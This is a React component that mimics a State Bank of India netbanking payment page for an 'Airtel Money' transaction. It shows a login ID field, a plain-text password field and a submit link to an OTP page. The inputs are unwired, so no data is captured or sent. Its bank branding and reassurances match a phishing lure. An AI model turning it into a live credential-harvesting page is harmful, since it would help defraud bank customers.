import React from "react";
import "./index.css";
import { Link } from "react-router-dom";

const Sbi = () => {
    return (
        <>
            <div className="sbi">
                <div className="sbi_card">
                        <div className="sbi_para">
                            <p>
                            Please enter your Netbanking Credentials in order to complete your transaction.<br />
                            This information will not be shared with the merchant.
                            </p>
                        </div>
                        <div className="sbi_add">
                            <p className="sbi_heading">Added Protection</p>
                        </div>
                        <div className="sbi_detail">
                            <p>
                                <span>Merchant Name</span>
                                <span>: Airtel Money</span>
                            </p>
                            <p>
                                <span>Date</span>
                                <span>: Feb 2, 2022</span>
                            </p>
                            <p>
                                <span>Personal Greeting</span>
                                <span>:This transaction is protected.</span>
                            </p>
                        </div>
                        <div className="sbi_method">
                            <p className="sbi_heading">
                            Select the Payment Method
                            </p>
                            <p className="method_radio">
                            <div>
                            <input
                            type="radio"
                            // onChange={}
                            // value={}
                            checked
                            />
                            <span className="sbi_heading">Sbi Netbanking™</span>
                            </div>
                            </p>
                        </div>
                        <div>
                            <div className="sbi_input">
                                <label>Login Id</label>
                                <div>
                                        <span>:</span>
                                        <input
                                            type="text"
                                        // onChange={}
                                        // value={}
                                        />
                                </div>
                            </div>
                    
                        <div className="sbi_input">
                            <label>Login Password</label>
                            <div>
                                <span>:</span>
                                <input
                                    type="text"
                                // onChange={}
                                // value={}
                                />
                            </div>
                        </div>
                        </div>
                        <div className="sbi_btn">
                            <button>
                            <Link to="/Sbi_otp">Submit</Link>
                            </button>
                        </div>
                </div>
            </div>

        </>
    )
};

export default Sbi;